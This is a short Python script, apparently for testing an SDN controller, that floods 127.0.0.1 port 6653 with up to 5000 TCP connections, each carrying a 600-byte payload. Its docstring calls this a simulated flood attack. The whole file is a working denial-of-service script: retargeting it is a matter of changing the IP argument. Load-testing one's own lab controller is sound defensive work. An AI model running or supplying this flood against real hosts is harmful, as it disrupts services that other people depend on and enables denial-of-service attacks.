import socket
import time
import threading
import random

def flood_attack(target_ip='127.0.0.1', target_port=6653, num_packets=100):
    """Simulate a TCP flood attack"""
    print(f"Starting TCP flood attack to {target_ip}:{target_port}")
    
    for i in range(num_packets):
        try:
            # Create a socket for each connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            s.send(b"X" * 600)  # Send large packet
            s.close()
            
            if i % 10 == 0:
                print(f"Sent {i} attack packets")
                
        except Exception as e:
            pass
            
    print("Attack completed")

if __name__ == "__main__":
    print("Starting quick attack test...")
    
    # Start flood attack
    flood_attack(num_packets=5000)